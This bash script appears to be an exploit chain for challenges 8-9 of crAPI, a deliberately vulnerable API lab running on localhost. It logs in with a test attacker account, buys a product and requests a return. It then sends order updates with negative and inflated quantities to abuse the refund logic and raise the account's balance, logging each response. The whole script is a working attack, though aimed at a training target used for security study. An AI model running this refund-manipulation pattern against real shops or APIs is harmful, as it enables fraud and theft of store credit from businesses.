#!/bin/bash
# crAPI Challenges 8-9: Refund Abuse (get item free + increase balance)
# Multi-step: Login → buy product → request refund → manipulate refund amount → profit
BASE="http://localhost:8888"
LOG="test_logs/crapi_chain4_refund.log"
> "$LOG"

echo "=== crAPI Chain: Refund Abuse ===" | tee -a "$LOG"
echo "Started: $(date)" | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Step 1: Login
echo "--- Step 1: Login ---" | tee -a "$LOG"
TOKEN=$(curl -s -X POST "$BASE/identity/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@test.com","password":"Passw0rd!"}' | \
  python3 -c "import sys,json; print(json.load(sys.stdin).get('token',''))" 2>/dev/null)
echo "Token: ${TOKEN:0:50}..." | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Step 2: Check current balance
echo "--- Step 2: Check current balance ---" | tee -a "$LOG"
curl -s -H "Authorization: Bearer $TOKEN" "$BASE/identity/api/v2/user/dashboard" | \
  python3 -c "import sys,json; d=json.load(sys.stdin); print(f'  Balance: \${d.get(\"available_credit\",0)}')" 2>/dev/null | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Step 3: List available products
echo "--- Step 3: List products ---" | tee -a "$LOG"
PRODUCTS=$(curl -s -H "Authorization: Bearer $TOKEN" "$BASE/workshop/api/shop/products")
echo "$PRODUCTS" | python3 -m json.tool 2>/dev/null | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Step 4: Buy a product
echo "--- Step 4: Buy a product (Seat, $10) ---" | tee -a "$LOG"
ORDER_RESP=$(curl -s -X POST "$BASE/workshop/api/shop/orders" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id":1,"quantity":1}')
echo "$ORDER_RESP" | python3 -m json.tool 2>/dev/null | tee -a "$LOG"
echo "" | tee -a "$LOG"

ORDER_ID=$(echo "$ORDER_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
echo "Order ID: $ORDER_ID" | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Step 5: Get order details
echo "--- Step 5: Get order details ---" | tee -a "$LOG"
curl -s -H "Authorization: Bearer $TOKEN" \
  "$BASE/workshop/api/shop/orders/$ORDER_ID" | python3 -m json.tool 2>/dev/null | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Step 6: Request refund with manipulated amount (the exploit)
echo "--- Step 6: Request return with inflated amount (exploit) ---" | tee -a "$LOG"

# Normal return first
echo "  Normal return request:" | tee -a "$LOG"
curl -s -X POST "$BASE/workshop/api/shop/orders/return_order?order_id=$ORDER_ID" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"status":"returned"}' | python3 -m json.tool 2>/dev/null | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Try with manipulated quantity/amount
echo "  Manipulated return (negative quantity):" | tee -a "$LOG"
curl -s -X PUT "$BASE/workshop/api/shop/orders/$ORDER_ID" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"quantity":-100,"status":"returned"}' | python3 -m json.tool 2>/dev/null | tee -a "$LOG"
echo "" | tee -a "$LOG"

echo "  Manipulated return (quantity 100):" | tee -a "$LOG"
curl -s -X PUT "$BASE/workshop/api/shop/orders/$ORDER_ID" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"quantity":100,"status":"return_pending"}' | python3 -m json.tool 2>/dev/null | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Step 7: Check balance after exploit
echo "--- Step 7: Check balance after exploit ---" | tee -a "$LOG"
curl -s -H "Authorization: Bearer $TOKEN" "$BASE/identity/api/v2/user/dashboard" | \
  python3 -c "import sys,json; d=json.load(sys.stdin); print(f'  Balance: \${d.get(\"available_credit\",0)}')" 2>/dev/null | tee -a "$LOG"
echo "" | tee -a "$LOG"

echo "=== Refund Abuse Chain Complete ===" | tee -a "$LOG"
echo "Finished: $(date)" | tee -a "$LOG"
